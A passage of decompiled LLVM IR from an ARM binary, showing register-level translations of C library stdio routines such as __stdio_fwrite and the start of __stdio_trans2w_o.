  br i1 %v9_2a7ec, label %dec_label_pc_2a7f4, label %dec_label_pc_2a7ec.dec_label_pc_2a7bc_crit_edge

dec_label_pc_2a7ec.dec_label_pc_2a7bc_crit_edge:  ; preds = %dec_label_pc_2a7ec
  %v0_2a7bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a7bc

dec_label_pc_2a7f4:                               ; preds = %dec_label_pc_2a7ec
  %v2_2a7f4 = icmp ne i32 %v1_2a7ec, 0
  store i1 %v2_2a7f4, i1* %cpsr_c.global-to-local, align 1
  %v7_2a7f8 = icmp slt i32 %v1_2a7ec, 2
  br i1 %v7_2a7f8, label %dec_label_pc_2a814, label %dec_label_pc_2a7fc

dec_label_pc_2a7fc:                               ; preds = %dec_label_pc_2a7f4
  %v0_2a7fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2a7fc, i32* %r0.global-to-local, align 4
  %v0_2a800 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a800 = add i32 %v0_2a800, 129
  store i32 %v1_2a800, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a814

dec_label_pc_2a814:                               ; preds = %dec_label_pc_2a778, %dec_label_pc_2a7fc, %dec_label_pc_2a7f4
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2a818 = load i32, i32* @r8, align 4
  %v2_2a818 = add i32 %v0_2a818, 176
  %v3_2a818 = inttoptr i32 %v2_2a818 to i32*
  %v4_2a818 = load i32, i32* %v3_2a818, align 4
  store i32 %v4_2a818, i32* %r0.global-to-local, align 4
  %v1_2a81c = add i32 %v4_2a818, 4
  %v2_2a81c = inttoptr i32 %v1_2a81c to i32*
  %v3_2a81c = load i32, i32* %v2_2a81c, align 4
  %v1_2a820 = add i32 %v3_2a81c, -1
  store i32 %v1_2a820, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a824 = icmp eq i32 %v1_2a820, 0
  store i32 %v1_2a820, i32* %v2_2a81c, align 4
  br i1 %v2_2a824, label %dec_label_pc_2a830, label %dec_label_pc_2a898

dec_label_pc_2a830:                               ; preds = %dec_label_pc_2a814
  %v0_2a830 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a830 = load i32, i32* %r0.global-to-local, align 4
  %v2_2a830 = add i32 %v1_2a830, 8
  %v3_2a830 = inttoptr i32 %v2_2a830 to i32*
  store i32 %v0_2a830, i32* %v3_2a830, align 4
  %v0_2a834 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2a834, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a838

dec_label_pc_2a838:                               ; preds = %dec_label_pc_2a868.dec_label_pc_2a838_crit_edge, %dec_label_pc_2a830
  %v0_2a838 = phi i32 [ %v0_2a838.pre, %dec_label_pc_2a868.dec_label_pc_2a838_crit_edge ], [ %v0_2a834, %dec_label_pc_2a830 ]
  %v1_2a838 = inttoptr i32 %v0_2a838 to i32*
  %v2_2a838 = load i32, i32* %v1_2a838, align 4
  store i32 %v2_2a838, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2a838, i32* @r2, align 4
  %v2_2a84471 = load i32, i32* %v1_2a838, align 4
  store i32 %v2_2a84471, i32* %r3.global-to-local, align 4
  %v3_2a84873 = icmp uge i32 %v2_2a84471, %v2_2a838
  store i1 %v3_2a84873, i1* %cpsr_c.global-to-local, align 1
  %v9_2a84879 = icmp eq i32 %v2_2a84471, %v2_2a838
  br i1 %v9_2a84879, label %dec_label_pc_2a850, label %dec_label_pc_2a868

dec_label_pc_2a850:                               ; preds = %dec_label_pc_2a838, %dec_label_pc_2a850.dec_label_pc_2a844_crit_edge
  %v0_2a85080 = phi i32 [ %v1_2a848.pre, %dec_label_pc_2a850.dec_label_pc_2a844_crit_edge ], [ %v2_2a838, %dec_label_pc_2a838 ]
  store i32 %v0_2a85080, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a860 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a860, label %dec_label_pc_2a864, label %dec_label_pc_2a850.dec_label_pc_2a844_crit_edge

dec_label_pc_2a850.dec_label_pc_2a844_crit_edge:  ; preds = %dec_label_pc_2a850
  %v0_2a844.pre = load i32, i32* @r2, align 4
  %v1_2a848.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2a844 = inttoptr i32 %v0_2a844.pre to i32*
  %v2_2a844 = load i32, i32* %v1_2a844, align 4
  store i32 %v2_2a844, i32* %r3.global-to-local, align 4
  %v3_2a848 = icmp uge i32 %v2_2a844, %v1_2a848.pre
  store i1 %v3_2a848, i1* %cpsr_c.global-to-local, align 1
  %v9_2a848 = icmp eq i32 %v2_2a844, %v1_2a848.pre
  br i1 %v9_2a848, label %dec_label_pc_2a850, label %dec_label_pc_2a868

dec_label_pc_2a864:                               ; preds = %dec_label_pc_2a850
  %v0_2a864 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2a864, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a868

dec_label_pc_2a868:                               ; preds = %dec_label_pc_2a838, %dec_label_pc_2a850.dec_label_pc_2a844_crit_edge, %dec_label_pc_2a864
  %v0_2a870 = phi i32 [ %v0_2a864, %dec_label_pc_2a864 ], [ %v2_2a84471, %dec_label_pc_2a838 ], [ %v2_2a844, %dec_label_pc_2a850.dec_label_pc_2a844_crit_edge ]
  %v1_2a868 = phi i32 [ %v0_2a864, %dec_label_pc_2a864 ], [ %v2_2a838, %dec_label_pc_2a838 ], [ %v1_2a848.pre, %dec_label_pc_2a850.dec_label_pc_2a844_crit_edge ]
  %v3_2a868 = icmp uge i32 %v0_2a870, %v1_2a868
  store i1 %v3_2a868, i1* %cpsr_c.global-to-local, align 1
  %v9_2a868 = icmp eq i32 %v0_2a870, %v1_2a868
  br i1 %v9_2a868, label %dec_label_pc_2a870, label %dec_label_pc_2a868.dec_label_pc_2a838_crit_edge

dec_label_pc_2a868.dec_label_pc_2a838_crit_edge:  ; preds = %dec_label_pc_2a868
  %v0_2a838.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a838

dec_label_pc_2a870:                               ; preds = %dec_label_pc_2a868
  %v2_2a870 = icmp ne i32 %v1_2a868, 0
  store i1 %v2_2a870, i1* %cpsr_c.global-to-local, align 1
  %v7_2a874 = icmp slt i32 %v1_2a868, 2
  br i1 %v7_2a874, label %dec_label_pc_2a898, label %dec_label_pc_2a878

dec_label_pc_2a878:                               ; preds = %dec_label_pc_2a870
  %v0_2a878 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2a878, i32* %r0.global-to-local, align 4
  %v0_2a87c = load i32, i32* %r1.global-to-local, align 4
  %v1_2a87c = add i32 %v0_2a87c, 129
  store i32 %v1_2a87c, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a898

dec_label_pc_2a894:                               ; preds = %dec_label_pc_2a4d8, %dec_label_pc_2a4bc, %dec_label_pc_2a4e4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_2a898

dec_label_pc_2a898:                               ; preds = %dec_label_pc_2a814, %dec_label_pc_2a870, %bb57, %dec_label_pc_2a51c, %dec_label_pc_2a878, %dec_label_pc_2a894
  %v0_2a898 = load i32, i32* @r5, align 4
  store i32 %v0_2a898, i32* %r0.global-to-local, align 4
  %v2_2a8a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2a8a0, i32* @r4, align 4
  store i32 %v6_2a47c, i32* @r5, align 4
  store i32 %v9_2a47c, i32* @r6, align 4
  store i32 %v12_2a47c, i32* @r7, align 4
  store i32 %v15_2a47c, i32* @r8, align 4
  ret i32 %v0_2a898

; uselistorder directives
  uselistorder i32 %v0_2a864, { 1, 0, 2 }
  uselistorder i32 %v1_2a848.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a838, { 1, 0 }
  uselistorder i32 %v0_2a7e8, { 1, 0, 2 }
  uselistorder i32 %v1_2a7cc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a7bc, { 1, 0 }
  uselistorder i32 %v0_2a764, { 1, 0, 2 }
  uselistorder i32 %v1_2a748.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a6fc, { 1, 0, 2 }
  uselistorder i32 %v1_2a6e0, { 0, 2, 1 }
  uselistorder i32 %v4_2a6bc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_2a66c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_2a5f0, { 1, 2, 0 }
  uselistorder i32 %v0_2a5bc, { 1, 0 }
  uselistorder i32 %v1_2a580, { 1, 0 }
  uselistorder i32 %v0_2a580, { 1, 0 }
  uselistorder i32 %v1_2a568, { 1, 2, 0, 3 }
  uselistorder i32 %v1_2a50c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 1, 8, 9, 10, 11, 12, 14, 13, 2, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 3, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 26, 23, 24, 25, 28, 27, 29, 30 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 11, 10, 1, 12, 13, 15, 14, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 16384, { 12, 11, 10, 0, 5, 3, 4, 1, 2, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @isatty, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_open, { 3, 0, 4, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 6, 0, 10, 9, 8, 7, 5, 4, 3, 2 }
  uselistorder i8 97, { 1, 0 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_2a898, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_2a894, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2a868, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a850, { 1, 0 }
  uselistorder label %dec_label_pc_2a814, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2a7ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a7d4, { 1, 0 }
  uselistorder label %dec_label_pc_2a778, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_2a768, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a750, { 1, 0 }
  uselistorder label %dec_label_pc_2a710, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_2a700, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2a648, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_2a5b0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_2a558, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_2a4f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a4bc, { 1, 2, 0 }
}

define i32 @function_2a8ac(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_2a8ac:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_2a8ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2a8ac, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2a8ac
  %v5_2a8ac = sdiv i32 %arg2, 16
  %v6_2a8ac = and i32 %v5_2a8ac, %tmp
  %v5_2a8b0 = sdiv i32 %arg2, 256
  %v6_2a8b0 = and i32 %v6_2a8ac, %v5_2a8b0
  %v2_2a8cc = load i32, i32* @r8, align 4
  %v4_2a8cc = and i32 %v6_2a8b0, %v2_2a8cc
  %v2_2a8d0 = trunc i32 %v4_2a8cc to i16
  %v4_2a8d0 = inttoptr i32 %v4_2a8cc to i16*
  store i16 %v2_2a8d0, i16* %v4_2a8d0, align 2
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2a8ac, %bb
  %v10_2a8d8 = phi i32 [ %tmp, %dec_label_pc_2a8ac ], [ 0, %bb ]
  ret i32 %v10_2a8d8

; uselistorder directives
  uselistorder i32 %v4_2a8cc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_2a8dc = load i32, i32* @r4, align 4
  store i32 %v3_2a8dc, i32* %stack_var_-20, align 4
  %v6_2a8dc = load i32, i32* @r5, align 4
  %v9_2a8dc = load i32, i32* @r6, align 4
  %v12_2a8dc = load i32, i32* @r7, align 4
  %v3_2a8e0 = load i16, i16* %arg3, align 2
  %v4_2a8e0 = zext i16 %v3_2a8e0 to i32
  store i32 %v4_2a8e0, i32* @r3, align 4
  %v1_2a8e4 = and i32 %v4_2a8e0, 512
  store i32 %v1_2a8e4, i32* @r4, align 4
  %v2_2a8e4 = icmp eq i32 %v1_2a8e4, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_2a8e4, label %dec_label_pc_2a8fc, label %dec_label_pc_2a9f8

dec_label_pc_2a8fc:                               ; preds = %entry
  %v2_2a8fc = add i32 %tmp, 4
  %v3_2a8fc = inttoptr i32 %v2_2a8fc to i32*
  %v4_2a8fc = load i32, i32* %v3_2a8fc, align 4
  %v2_2a904 = add i32 %tmp, 16
  %v3_2a904 = inttoptr i32 %v2_2a904 to i32*
  %v4_2a904 = load i32, i32* %v3_2a904, align 4
  store i32 %v4_2a904, i32* @r0, align 4
  %v2_2a908 = add i32 %tmp, 12
  %v3_2a908 = inttoptr i32 %v2_2a908 to i32*
  %v4_2a908 = load i32, i32* %v3_2a908, align 4
  store i32 %v4_2a908, i32* @r3, align 4
  %v4_2a90c = icmp eq i32 %v4_2a8fc, -2
  %v2_2a910 = sub i32 %v4_2a908, %v4_2a904
  br i1 %v4_2a90c, label %dec_label_pc_2a910, label %dec_label_pc_2a938

dec_label_pc_2a910:                               ; preds = %dec_label_pc_2a8fc
  %v3_2a914 = icmp ugt i32 %v2_2a910, %arg2
  br i1 %v3_2a914, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_2a910
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_2a910, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_2a910, %dec_label_pc_2a910 ]
  %v0_2a91c = phi i32 [ %arg2, %bb ], [ %v2_2a910, %dec_label_pc_2a910 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_2a91c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_2a924 = call i32 @memcpy()
  %v0_2a928 = load i32, i32* @r5, align 4
  %v1_2a928 = add i32 %v0_2a928, 16
  %v2_2a928 = inttoptr i32 %v1_2a928 to i32*
  %v3_2a928 = load i32, i32* %v2_2a928, align 4
  %v1_2a92c = load i32, i32* @r4, align 4
  %v2_2a92c = add i32 %v1_2a92c, %v3_2a928
  store i32 %v2_2a92c, i32* %v2_2a928, align 4
  br label %dec_label_pc_2aa0c

dec_label_pc_2a938:                               ; preds = %dec_label_pc_2a8fc
  store i32 %v2_2a910, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_2a910, %arg2
  br i1 %tmp18, label %dec_label_pc_2a9d8, label %dec_label_pc_2a944

dec_label_pc_2a944:                               ; preds = %dec_label_pc_2a938
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_2a94c = call i32 @memcpy()
  %v0_2a950 = load i32, i32* @r5, align 4
  %v1_2a950 = add i32 %v0_2a950, 16
  %v2_2a950 = inttoptr i32 %v1_2a950 to i32*
  %v3_2a950 = load i32, i32* %v2_2a950, align 4
  %v1_2a954 = inttoptr i32 %v0_2a950 to i16*
  %v2_2a954 = load i16, i16* %v1_2a954, align 2
  %v1_2a958 = load i32, i32* @r6, align 4
  %v2_2a958 = add i32 %v1_2a958, %v3_2a950
  %v1_2a95c = and i16 %v2_2a954, 256
  %v2_2a95c = icmp eq i16 %v1_2a95c, 0
  store i32 %v2_2a958, i32* %v2_2a950, align 4
  br i1 %v2_2a95c, label %dec_label_pc_2aa0c, label %dec_label_pc_2a968

dec_label_pc_2a968:                               ; preds = %dec_label_pc_2a944
  %v0_2a968 = load i32, i32* @r7, align 4
  %v0_2a970 = load i32, i32* @r6, align 4
  %v4_2a974 = call i32 @memrchr(i32 %v0_2a968, i32 10, i32 %v0_2a970, i32 %v2_2a958)
  %v2_2a978 = icmp eq i32 %v4_2a974, 0
  br i1 %v2_2a978, label %dec_label_pc_2aa0c, label %dec_label_pc_2a980

dec_label_pc_2a980:                               ; preds = %dec_label_pc_2a968
  %v0_2a980 = load i32, i32* @r5, align 4
  store i32 %v0_2a980, i32* @r0, align 4
  %v0_2a984 = call i32 @__stdio_wcommit()
  %v2_2a988 = icmp eq i32 %v0_2a984, 0
  br i1 %v2_2a988, label %dec_label_pc_2aa0c, label %dec_label_pc_2a990

dec_label_pc_2a990:                               ; preds = %dec_label_pc_2a980
  %v1_2a990 = load i32, i32* @r6, align 4
  %v3_2a990 = icmp uge i32 %v0_2a984, %v1_2a990
  %v1_2a990.v0_2a984 = select i1 %v3_2a990, i32 %v1_2a990, i32 %v0_2a984
  store i32 %v1_2a990.v0_2a984, i32* @r4, align 4
  %v2_2a99c = sub i32 %v1_2a990, %v1_2a990.v0_2a984
  %v0_2a9a0 = load i32, i32* @r7, align 4
  %v2_2a9a0 = add i32 %v0_2a9a0, %v2_2a99c
  store i32 %v2_2a9a0, i32* %r7.global-to-local, align 4
  store i32 %v2_2a9a0, i32* @r0, align 4
  store i32 %v1_2a990.v0_2a984, i32* @r2, align 4
  %v4_2a9b0 = call i32 @__GI_memchr(i32 %v2_2a9a0, i32 10, i32 %v1_2a990.v0_2a984, i32 %v2_2a99c)
  %v2_2a9b4 = icmp eq i32 %v4_2a9b0, 0
  br i1 %v2_2a9b4, label %dec_label_pc_2aa0c, label %dec_label_pc_2a9bc

dec_label_pc_2a9bc:                               ; preds = %dec_label_pc_2a990
  %v0_2a9bc = load i32, i32* @r5, align 4
  %v1_2a9bc = add i32 %v0_2a9bc, 16
  %v2_2a9bc = inttoptr i32 %v1_2a9bc to i32*
  %v3_2a9bc = load i32, i32* %v2_2a9bc, align 4
  %v0_2a9c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_2a9c0 = load i32, i32* @r4, align 4
  %v2_2a9c0 = sub i32 %v0_2a9c0, %v4_2a9b0
  %v2_2a9c4 = add i32 %v2_2a9c0, %v1_2a9c0
  %v2_2a9c8 = sub i32 %v3_2a9bc, %v2_2a9c4
  %v1_2a9cc = load i32, i32* @r6, align 4
  %v2_2a9cc = sub i32 %v1_2a9cc, %v2_2a9c4
  store i32 %v2_2a9cc, i32* @r6, align 4
  store i32 %v2_2a9c8, i32* %v2_2a9bc, align 4
  br label %dec_label_pc_2aa0c

dec_label_pc_2a9d8:                               ; preds = %dec_label_pc_2a938
  %v2_2a9d8 = add i32 %tmp, 8
  %v3_2a9d8 = inttoptr i32 %v2_2a9d8 to i32*
  %v4_2a9d8 = load i32, i32* %v3_2a9d8, align 4
  store i32 %v4_2a9d8, i32* @r3, align 4
  %v9_2a9dc = icmp eq i32 %v4_2a904, %v4_2a9d8
  br i1 %v9_2a9dc, label %dec_label_pc_2a9f8, label %dec_label_pc_2a9e4

dec_label_pc_2a9e4:                               ; preds = %dec_label_pc_2a9d8
  store i32 %tmp, i32* @r0, align 4
  %v0_2a9e8 = call i32 @__stdio_wcommit()
  %v2_2a9ec = icmp eq i32 %v0_2a9e8, 0
  br i1 %v2_2a9ec, label %dec_label_pc_2a9e4.dec_label_pc_2a9f8_crit_edge, label %bb15

dec_label_pc_2a9e4.dec_label_pc_2a9f8_crit_edge:  ; preds = %dec_label_pc_2a9e4
  %v0_2a9f8.pre = load i32, i32* @r6, align 4
  %v0_2a9fc.pre = load i32, i32* @r5, align 4
  %v0_2aa00.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2a9f8

bb15:                                             ; preds = %dec_label_pc_2a9e4
  %v1_2a9f0 = load i32, i32* @r4, align 4
  store i32 %v1_2a9f0, i32* @r6, align 4
  br label %dec_label_pc_2aa0c

dec_label_pc_2a9f8:                               ; preds = %dec_label_pc_2a9e4.dec_label_pc_2a9f8_crit_edge, %entry, %dec_label_pc_2a9d8
  %v0_2aa00 = phi i32 [ %v0_2aa00.pre, %dec_label_pc_2a9e4.dec_label_pc_2a9f8_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_2a9d8 ]
  %v0_2a9fc = phi i32 [ %v0_2a9fc.pre, %dec_label_pc_2a9e4.dec_label_pc_2a9f8_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_2a9d8 ]
  %v0_2a9f8 = phi i32 [ %v0_2a9f8.pre, %dec_label_pc_2a9e4.dec_label_pc_2a9f8_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_2a9d8 ]
  %v1_2a9fc = inttoptr i32 %v0_2a9fc to i16*
  %v5_2aa04 = call i32 @__stdio_WRITE(i16* %v1_2a9fc, i32 %v0_2aa00, i32 %v0_2a9f8)
  store i32 %v5_2aa04, i32* @r6, align 4
  br label %dec_label_pc_2aa0c

dec_label_pc_2aa0c:                               ; preds = %bb15, %dec_label_pc_2a990, %dec_label_pc_2a980, %dec_label_pc_2a968, %dec_label_pc_2a944, %dec_label_pc_2a9bc, %bb12, %dec_label_pc_2a9f8
  %v0_2aa0c = load i32, i32* @r6, align 4
  %v2_2aa14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2aa14, i32* @r4, align 4
  store i32 %v6_2a8dc, i32* @r5, align 4
  store i32 %v9_2a8dc, i32* @r6, align 4
  store i32 %v12_2a8dc, i32* @r7, align 4
  ret i32 %v0_2aa0c

; uselistorder directives
  uselistorder i32 %v2_2a9c4, { 1, 0 }
  uselistorder i32 %v2_2a99c, { 1, 0 }
  uselistorder i32 %v1_2a990.v0_2a984, { 1, 2, 0, 3 }
  uselistorder i32 %v1_2a990, { 1, 0, 2 }
  uselistorder i32 %v2_2a910, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_2aa0c, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_2a9f8, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2aa1c = load i32, i32* @r4, align 4
  store i32 %v3_2aa1c, i32* %stack_var_-8, align 4
  %v3_2aa20 = load i16, i16* %arg1, align 2
  %v4_2aa20 = zext i16 %v3_2aa20 to i32
  %v2_2aa24 = and i32 %v4_2aa20, %arg2
  %v4_2aa24 = icmp eq i32 %v2_2aa24, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_2aa24, label %dec_label_pc_2aa30, label %dec_label_pc_2aa40

dec_label_pc_2aa30:                               ; preds = %entry
  %v1_2aa30 = and i32 %v4_2aa20, 2176
  %v2_2aa30 = icmp eq i32 %v1_2aa30, 0
  br i1 %v2_2aa30, label %dec_label_pc_2aa38, label %dec_label_pc_2aa4c

dec_label_pc_2aa38:                               ; preds = %dec_label_pc_2aa30
  %v2_2aa38 = or i32 %v4_2aa20, %arg2
  %v1_2aa3c = trunc i32 %v2_2aa38 to i16
  store i16 %v1_2aa3c, i16* %arg1, align 2
  %v0_2aa40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2aa40

dec_label_pc_2aa40:                               ; preds = %entry, %dec_label_pc_2aa38
  %v0_2aa84 = phi i32 [ %tmp, %entry ], [ %v0_2aa40.pre, %dec_label_pc_2aa38 ]
  %v1_2aa40 = inttoptr i32 %v0_2aa84 to i16*
  %v2_2aa40 = load i16, i16* %v1_2aa40, align 2
  %v3_2aa40 = zext i16 %v2_2aa40 to i32
  store i32 %v3_2aa40, i32* @ip, align 4
  %v1_2aa44 = and i32 %v3_2aa40, 32
  %v2_2aa44 = icmp eq i32 %v1_2aa44, 0
  br i1 %v2_2aa44, label %dec_label_pc_2aa74, label %dec_label_pc_2aa4c

dec_label_pc_2aa4c:                               ; preds = %dec_label_pc_2aa30, %dec_label_pc_2aa40
  %v0_2aa50 = call i32 @__aeabi_read_tp()
  store i32 %v0_2aa50, i32* %r0.global-to-local, align 4
  %v3_2aa54 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2aa54 = sext i16 %v3_2aa54 to i32
  store i32 9, i32* %r2.global-to-local, align 4
  %v3_2aa5c = add i32 %v4_2aa54, %v0_2aa50
  %v4_2aa5c = inttoptr i32 %v3_2aa5c to i32*
  store i32 9, i32* %v4_2aa5c, align 4
  br label %dec_label_pc_2aa60

dec_label_pc_2aa60:                               ; preds = %dec_label_pc_2aa9c, %dec_label_pc_2aa4c
  %v0_2aa60 = load i32, i32* @r4, align 4
  %v1_2aa60 = inttoptr i32 %v0_2aa60 to i16*
  %v2_2aa60 = load i16, i16* %v1_2aa60, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_2aa68 = or i16 %v2_2aa60, 8
  store i16 %v1_2aa68, i16* %v1_2aa60, align 2
  br label %bb11

dec_label_pc_2aa74:                               ; preds = %dec_label_pc_2aa40
  %tmp14 = urem i16 %v2_2aa40, 4
  %v2_2aa74 = icmp eq i16 %tmp14, 0
  br i1 %v2_2aa74, label %dec_label_pc_2aad0, label %dec_label_pc_2aa7c

dec_label_pc_2aa7c:                               ; preds = %dec_label_pc_2aa74
  %v1_2aa7c = and i32 %v3_2aa40, 4
  store i32 %v1_2aa7c, i32* @r1, align 4
  %v2_2aa7c = icmp eq i32 %v1_2aa7c, 0
  br i1 %v2_2aa7c, label %dec_label_pc_2aa84, label %dec_label_pc_2aab4

dec_label_pc_2aa84:                               ; preds = %dec_label_pc_2aa7c
  %v1_2aa84 = add i32 %v0_2aa84, 20
  %v2_2aa84 = inttoptr i32 %v1_2aa84 to i32*
  %v3_2aa84 = load i32, i32* %v2_2aa84, align 4
  store i32 %v3_2aa84, i32* %r2.global-to-local, align 4
  %v1_2aa88 = add i32 %v0_2aa84, 16
  %v2_2aa88 = inttoptr i32 %v1_2aa88 to i32*
  %v3_2aa88 = load i32, i32* %v2_2aa88, align 4
  %v9_2aa8c = icmp eq i32 %v3_2aa84, %v3_2aa88
  br i1 %v9_2aa8c, label %dec_label_pc_2aa94, label %dec_label_pc_2aa9c

dec_label_pc_2aa94:                               ; preds = %dec_label_pc_2aa84
  %v1_2aa94 = and i32 %v3_2aa40, 2
  %v2_2aa94 = icmp eq i32 %v1_2aa94, 0
  br i1 %v2_2aa94, label %dec_label_pc_2aab4, label %dec_label_pc_2aa9c

dec_label_pc_2aa9c:                               ; preds = %dec_label_pc_2aa84, %dec_label_pc_2aa94
  %v1_2aa9c = and i32 %v3_2aa40, 1024
  %tmp12 = udiv i32 %v1_2aa9c, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_2aaa8 = call i32 @__GI_fseek()
  store i32 %v0_2aaa8, i32* %r0.global-to-local, align 4
  %v2_2aaac = icmp eq i32 %v0_2aaa8, 0
  br i1 %v2_2aaac, label %.dec_label_pc_2aab4_crit_edge, label %dec_label_pc_2aa60

.dec_label_pc_2aab4_crit_edge:                    ; preds = %dec_label_pc_2aa9c
  %v0_2aab4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2aab4

dec_label_pc_2aab4:                               ; preds = %.dec_label_pc_2aab4_crit_edge, %dec_label_pc_2aa7c, %dec_label_pc_2aa94
